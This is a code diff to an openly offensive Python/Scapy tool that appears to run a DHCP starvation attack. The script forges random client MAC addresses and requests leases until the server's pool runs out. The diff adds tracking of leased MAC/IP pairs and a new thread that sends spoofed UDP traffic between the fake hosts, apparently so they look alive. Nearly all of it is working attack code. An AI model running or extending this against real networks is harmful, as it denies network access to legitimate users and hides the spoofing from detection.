@@ -13,6 +13,8 @@ running = True
 send_interval = 0.01
 send_jitter = 0
 
+leased_macs = [] # Different than fake_macs, these are ones with IP addr
+
 def rand_mac():
     m=[0x00,0x0c,0x29, random.randint(0,255), random.randint(0,255), random.randint(0,255)]
     mac=':'.join(f"{x:02x}" for x in m); fake_macs.append(mac); return mac
@@ -51,6 +53,7 @@ def handle(p):
                 ip=p[BOOTP].yiaddr; srv=p[IP].src; xid=p[BOOTP].xid
                 mac = xid_mac.pop(xid,None) or p[Ether].dst
                 if not quiet: print(f"[+] OFFER {ip} from {srv} (xid={xid}, mac={mac})")
+                leased_macs.append({'mac':mac, 'ip':ip})
                 sendp(make_request(mac,ip,srv,xid), iface=iface, verbose=0)
                 requested.append(ip)
                 return
@@ -61,6 +64,26 @@ def handle(p):
             if t==6: # NAK
                 print("[!] NAK received - pool may be exhausted"); return
 
+def forge_unicast_pkt(src_mac, src_ip, dst_mac, dst_ip):
+    pkt = (Ether(src=src_mac, dst=dst_mac)/
+            IP(src=src_ip, dst=dst_ip)/
+            UDP(sport=random.randint(1024,65535),dport=random.randint(1024,65535)))
+    sendp(pkt, iface=iface, verbose=0)
+    
+def interspoofed_comm():
+    while running:
+        if len(leased_macs) >= 2:
+            a,b = random.sample(leased_macs, 2)
+            forge_unicast_pkt(a['mac'], a['ip'], b['mac'], b['ip'])
+            if not quiet:
+                print(f"[NOTIF] Fake Comms: {a['mac']}//{a['ip']} -> {b['mac']}//{b['ip']}")
+            time.sleep(0.05)
+            forge_unicast_pkt(b['mac'], b['ip'], a['mac'], a['ip'])
+            if not quiet:
+                print(f"[NOTIF] Fake Comms: {b['mac']}//{b['ip']} -> {a['mac']}//{a['ip']}")
+        wait_t = random.random() + 1
+        time.sleep(wait_t)
+            
 def attacker():
     global sent
     if not quiet: print(f"[*] Starting on {iface} - Ctrl+C to stop")
@@ -96,8 +119,9 @@ def main():
     args=p.parse_args(); iface=args.interface; quiet=args.quiet
     send_interval=max(0.1, args.interval); send_jitter=max(0, min(0.9, args.jitter))
     if os.geteuid()!=0: print("Run as root"); sys.exit(1)
-    t1=threading.Thread(target=listener,daemon=True); t1.start()
-    t2=threading.Thread(target=attacker,daemon=True); t2.start()
+    threading.Thread(target=listener, daemon=True).start()
+    threading.Thread(target=attacker, daemon=True).start()
+    threading.Thread(target=interspoofed_comm, daemon=True).start()
     try:
         if args.duration: time.sleep(args.duration)
         else:
